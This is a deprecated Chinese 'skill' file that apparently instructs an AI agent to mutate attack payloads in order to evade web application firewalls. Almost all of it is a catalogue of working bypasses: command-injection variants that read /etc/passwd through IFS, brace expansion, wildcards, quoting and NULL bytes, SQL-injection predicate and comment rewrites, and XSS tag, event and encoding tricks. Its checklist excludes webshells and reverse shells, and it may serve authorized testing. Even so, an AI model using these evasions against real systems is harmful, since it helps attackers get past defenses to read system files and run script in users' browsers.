# Payload 语义变异 Skill（生产级）

> **⚠️ DEPRECATED**: This file is deprecated. Use vulnerability-specific skill files:
> - `cmd_injection_mutation.md` for command injection
> - `sql_injection_mutation.md` for SQL injection
> - `xss_mutation.md` for XSS
>
> 本文件已弃用，请使用按漏洞类型分类的专用 skill 文件。

## 核心任务

基于漏洞语义理解的结果，提出具体的 `part_operations`，通过改变 Payload 的语法表达方式来绕过 WAF，同时保持原始验证目标。

## 变异策略层次

变异从浅到深分为 4 个层次，**优先使用深层策略**：

### L1：同义替换（最浅——仅改变表面表达）
```
cat /etc/passwd → head /etc/passwd         （命令等价组内替换）
;id → |id                                  （分隔符替换）
OR 1=1 → OR 1 BETWEEN 0 AND 2             （谓词等价变换）
<script> → <img>                           （标签替换）
```

### L2：结构重组（中等——改变 Payload 的语法组织）
```
;cat /etc/passwd → ;cat /etc/./passwd      （路径重组）
;id → ;$(id) → ;`id`                       （命令替换包装）
OR 1=1 -- → OR (1)=(1)#                    （括号+注释符组合变化）
<script>alert(1)</script> → <svg onload=alert(1)> （标签+事件双重变化）
```

### L3：间接引用与控制流（深层——引入中间层）
```
cat → c=cat;$c /etc/passwd                  （变量间接引用）
cat /etc/passwd → cat /etc/passwd | head    （追加无害管道）
cat /etc/passwd → cat /etc/passwd 2>/dev/null （添加错误抑制）
cat /etc/passwd → for f in /etc/passwd; do cat $f; done  （循环包装）
```

### L4：Shell 特性利用（最深——利用解释器特异性）
```
cat → ${PATH:0:1}bin${PATH:0:1}cat          （PATH 切片构造路径）
cat → {c,h}at                                （花括号展开）
cat /etc/passwd → cat /etc/pass?d            （通配符模糊）
空格 → ${IFS}                                 （IFS 环境变量替换空白）
cat → /bin/c?t                                （通配符隐藏命令名）
cat <<< /etc/passwd                           （here-string 替代文件参数）
cat < /etc/passwd                             （输入重定向替代命令行参数）
cat /etc/passwd → $(cat /etc/passwd)          （子 Shell 包装）
```

### 已废弃技术（禁止使用）

以下技术曾经有效但现已被现代 WAF 广泛检测，**不要在变异中使用**：

#### IFS 空白替换（已废弃）
- ❌ `${IFS}`, `$IFS`, `${IFS%??}` 等所有 IFS 变体
- **原因**：现代 WAF 专门针对 IFS 模式进行检测，使用反而增加拦截风险
- **替代方案**：使用制表符 `\t`、花括号展开 `{cat,/etc/passwd}`、或 here-string 等其他技术

## 命令注入变异技术目录

### 技术 1：命令等价替换
- **原理**：使用等价组内的同义命令
- **适用部件**：`injection_command`
- **示例**：`cat → head`, `whoami → id`, `ls → find . -maxdepth 1`, `netstat → ss`
- **WAF 绕过效果**：WAF 可能只黑名单了常见命令名

### 技术 2：分隔符替换
- **原理**：替换命令分隔符为等价形式
- **适用部件**：`separator`
- **变换表**：
  ```
  ;  → |  → || → && → %0a → \n → & → %26 → `...` → $(...)
  ```
- **注意**：`|` 会改变 stdout；`||` 和 `&&` 有条件依赖；换行符在某些 shell 中需要特殊处理

### 技术 3：参数重排与路径变换
- **原理**：改变参数顺序、路径引用方式
- **适用部件**：`argument`, `path`
- **变换表**：
  ```
  /etc/passwd → /etc/./passwd → /etc/../etc/passwd → /etc//passwd
  /etc/passwd → /etc/pass?d → /etc/p* → /etc/[p]asswd → /etc/pass[w]d
  cat → /bin/cat → /usr/bin/cat → $(which cat) → ${PATH//:/\/bin\/cat }
  ```

### 技术 4：变量间接引用
- **原理**：通过变量定义间接调用命令
- **适用部件**：`var_indirection`
- **示例**：
  ```
  cat → c=cat;$c /etc/passwd
  cat → x=ca;y=t;$x$y /etc/passwd
  cat → a=cat;${a} /etc/passwd
  cat → cmd=$(echo cat);$cmd /etc/passwd
  cat → $(echo cat) /etc/passwd
  ```

### 技术 6：花括号展开
- **原理**：利用 bash 花括号展开生成命令或路径
- **适用部件**：`brace_expansion`
- **示例**：
  ```
  cat → {cat,head}              （展开为两个命令，取第一个）
  cat → {c,h}at                 （展开为 cat 和 hat）
  cat → {ca,}t                  （展开为 cat 和 t）
  /etc/passwd → /{etc,etc}/passwd  （展开为 /etc/passwd 两次）
  ```

### 技术 7：通配符路径
- **原理**：使用 `?`, `*`, `[]` 模糊路径中的字符
- **适用部件**：`wildcard`
- **示例**：
  ```
  /etc/passwd → /etc/pass?d → /etc/pass* → /etc/p?sswd
  /etc/passwd → /etc/[p]asswd → /etc/[pP]asswd
  cat → c?t → c* → [c]at → /bin/c?t
  ```

### 技术 8：管道与条件结构
- **原理**：追加管道或条件执行结构
- **适用部件**：`pipeline`, `conditional`
- **示例**：
  ```
  cat /etc/passwd → cat /etc/passwd | cat
  cat /etc/passwd → cat /etc/passwd | head -1
  cat /etc/passwd → cat /etc/passwd && echo DONE
  cat /etc/passwd → cat /etc/passwd || true
  cat /etc/passwd → cat /etc/passwd; echo EXEC_OK
  ```

### 技术 9：错误抑制
- **原理**：添加 stderr/stdout 重定向抑制错误输出
- **适用部件**：`stderr_handling`
- **变换表**：
  ```
  2>/dev/null           # 仅抑制错误输出
  2>&-                  # 关闭错误输出文件描述符
  2>&1                  # 合并错误到标准输出
  2>&1 >/dev/null       # 先合并，再丢弃全部输出
  >/dev/null 2>&1       # 先丢弃标准输出，再合并错误
  2>&- 1>&-             # 关闭两个文件描述符
  2>/tmp/null           # 重定向到临时文件（适用于无/dev/null环境）
  ```
- **注意**：组合重定向顺序很关键；`2>&1 >/dev/null` 和 `>/dev/null 2>&1` 行为不同

### 技术 10：子 Shell 包装
- **原理**：将命令包装在子 Shell 中执行
- **适用部件**：`subshell`
- **示例**：
  ```
  cat /etc/passwd → $(cat /etc/passwd)
  cat /etc/passwd → `cat /etc/passwd`
  ```

### 技术 11：Here-string / 输入重定向
- **原理**：用 here-string 或输入重定向替代命令行参数
- **适用部件**：`here_string`
- **示例**：
  ```
  cat /etc/passwd → cat <<< /etc/passwd
  cat /etc/passwd → cat < /etc/passwd
  cat /etc/passwd → rev <<< /etc/passwd | rev  （倒转两次等于不变）
  ```

### 技术 12：有限循环包装
- **原理**：将命令包装在有限次数的循环中
- **适用部件**：`bounded_loop`
- **示例**：
  ```
  cat /etc/passwd → for f in /etc/passwd; do cat $f; done
  cat /etc/passwd → for i in 1; do cat /etc/passwd; done
  cat /etc/passwd → while read l; do echo $l; done < /etc/passwd
  ```

### 技术 13：引号与反斜杠混淆
- **原理**：利用 shell 引号解析规则混淆命令字符
- **适用部件**：`injection_command`, `argument`
- **示例**：
  ```
  cat → c"a"t → c'a't → c\at → ca\t
  cat /etc/passwd → cat /e"tc"/passwd → cat /etc/pass'w'd
  cat /etc/passwd → cat /etc/pas\swd → cat /e\tc/passwd
  whoami → who"am"i → who'am'i → wh\oami
  ```
- **注意**：反斜杠转义在某些上下文中可能失效

### 技术 14：命令截断与 NULL 字节
- **原理**：使用分号或 NULL 字节截断后续内容
- **适用部件**：`separator`, `conditional`
- **示例**：
  ```
  ;cat /etc/passwd;# → WAF 可能只检查 # 之前
  ;cat /etc/passwd%00 ignoredtext → NULL 字节后内容被忽略（PHP < 5.3）
  ;cat /etc/passwd;--sp → SQL 风格注释混淆
  ```

### 技术 15：环境变量切片构造
- **原理**：使用 `$PATH`, `$HOME` 等环境变量切片拼接路径或命令
- **适用部件**：`path`, `var_indirection`
- **示例**：
  ```
  /bin/cat → ${PATH:0:1}bin${PATH:0:1}cat
  /etc/passwd → ${HOME:0:1}etc${HOME:0:1}passwd
  cat → ${PWD:0:1}bin${PWD:0:1}cat
  ```

### 技术 16：Base 命令变体
- **原理**：使用 base32/base64/basenc 等编码命令的变体
- **适用部件**：`injection_command`
- **示例**：
  ```
  echo → printf → print（awk/perl 中）
  cat → tac | tac → rev | rev → tail -n +1 → head -n 999999
  grep → awk '/pattern/' → sed -n '/pattern/p'
  ls → echo * → printf '%s\n' *
  ```

### 技术 17：命令搜索路径操作
- **原理**：利用 PATH 变量或相对路径查找命令
- **适用部件**：`path`
- **示例**：
  ```
  cat → /bin/cat → /usr/bin/cat → $(which cat)
  cat → ./cat（如果当前目录在 PATH 中）
  cat → $(type -p cat)
  cat → $(command -v cat)
  ```

### 技术 18：算术与逻辑表达式包装
- **原理**：使用 shell 算术表达式包装命令
- **适用部件**：`subshell`, `conditional`
- **示例**：
  ```
  cat /etc/passwd → cat /etc/passwd || echo failed
  cat /etc/passwd → [ -f /etc/passwd ] && cat /etc/passwd
  cat /etc/passwd → test -f /etc/passwd && cat /etc/passwd
  ```

## SQL 注入变异技术目录

### 谓词重写
```
OR 1=1    → OR 1 BETWEEN 0 AND 2
OR 1=1    → OR 1 IN (1)
OR 1=1    → OR 'a' LIKE 'a'
OR 1=1    → OR NOT(1<>1)
OR 1=1    → OR CASE WHEN 1 THEN 1 END
OR 1=1    → OR 1<=>1          （NULL 安全等于）
OR 1=1    → OR 'a'='a'
OR 1=1    → OR 1&1
```

### 运算符切换
```
OR → ||, |   (MySQL: || 是 OR；需 PIPES_AS_CONCAT=OFF)
AND → &&, &
NOT → !
XOR → ^
```

### 比较值重写
```
'admin' → CHAR(97,100,109,105,110)
'admin' → CONCAT('ad','min')
'admin' → 0x61646D696E
'admin' → UNHEX('61646D696E')
'admin' → REVERSE('nimda')   （需要额外 REVERSE 调用）
```

### 子查询包装
```
SELECT ... WHERE id=1
→ SELECT ... WHERE id=(SELECT 1)
→ SELECT ... WHERE id=(SELECT id FROM users LIMIT 1)
→ SELECT ... WHERE 1=(SELECT 1 FROM DUAL)
```

### 注释混淆
```
-- (单行，需要后跟空格)
→ --%20, --\t, --\n
→ # (MySQL 单行)
→ ;%00 (PHP nullbyte 终止)
→ /*...*/ 内联注释
→ /*!50000...*/ 版本条件注释（MySQL）
```

### 高级 SQL 绕过技术

#### 科学计数法与替代数字表示
```sql
1=1 → 1e0=1e0 → 1.=1. → 0x1=0x1 → b'1'=b'1'
```

#### 类型转换函数
```sql
'admin' → CAST('admin' AS CHAR)
'admin' → CONVERT('admin', CHAR)
1 → CAST(1 AS UNSIGNED) → CAST(0x31 AS CHAR)
```

#### NULL 安全比较与位运算
```sql
1=1 → 1<=>1 → 1&1 → 1|0 → ~0<>0
OR 1=1 → OR !!1 → OR !0 → OR 1^0
```

#### 函数名大小写与空白混淆
```sql
SELECT → SeLeCt → select → sElEcT
UNION → /*!50000UNION*/ → UNI%0aON → UNI%09ON
```

#### 括号与操作符优先级
```sql
1=1 → (1)=(1) → ((1))=((1)) → (1)IN(1) → (1)LIKE(1)
OR 1=1 → OR(1)=(1) → OR(1)IN(1,2,3)
```

## XSS 变异技术目录

### 标签+事件组合变换
```
<script>alert(1)</script>
→ <img src=x onerror=alert(1)>
→ <svg onload=alert(1)>
→ <body onload=alert(1)>
→ <details open ontoggle=alert(1)>
→ <input autofocus onfocus=alert(1)>
→ <marquee onstart=alert(1)>
→ <video><source onerror=alert(1)>
→ <audio src=x onerror=alert(1)>
→ <iframe srcdoc="<script>alert(1)</script>">
```

### JS 表达式变换
```
alert(1)
→ prompt(1)
→ confirm(1)
→ (alert)(1)
→ window.alert(1)
→ top['alert'](1)
→ self[String.fromCharCode(97,108,101,114,116)](1)
→ Function('alert(1)')()
→ setTimeout('alert(1)')
→ setInterval('alert(1)')
```

### 高级 XSS 绕过技术

#### 标签与属性大小写混合
```html
<script> → <ScRiPt> → <SCRIPT> → <sCrIpT>
onerror → oNeRrOr → ONERROR → OnErRoR
```

#### 特殊属性与伪协议
```html
<a href=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<form action=javascript:alert(1)>
<isindex action=javascript:alert(1)>
```

#### 事件处理器变体
```html
onload → onpageshow → DOMContentLoaded → onbeforeload
onerror → onerror\n=alert → onerror%0a=alert
onclick → ondblclick → onmousedown → onmouseup
```

#### 无引号属性与编码
```html
<img src=x onerror=alert(1)>  （无引号）
<img src=x onerror=alert&#40;1&#41;>  （HTML 实体）
<img src=x onerror=alert(1)>  （Unicode 转义）
<img src=x onerror=eval('\x61lert(1)')>  （Hex 转义）
```

#### 标签闭合变体
```html
<script>alert(1)</script> → <script>alert(1)//
<img src=x onerror=alert(1)> → <img src=x onerror=alert(1)//
<svg><script>alert(1)</script></svg> → <svg><script>alert(1)
```

## 变异原则检查清单

每轮提出操作前，确认：
- [ ] 每个操作的目标部件存在且类型正确
- [ ] 不删除 required=true 的部件
- [ ] 至少有一个实质性的语义变化
- [ ] 没有使用编码/解码/转义
- [ ] 保持了原始验证目标
- [ ] 没有引入 WebShell/反弹 Shell/持久化/文件写入
- [ ] 没有引入无限循环/后台执行
- [ ] 优先选择 `available_directions` 中未使用的方向
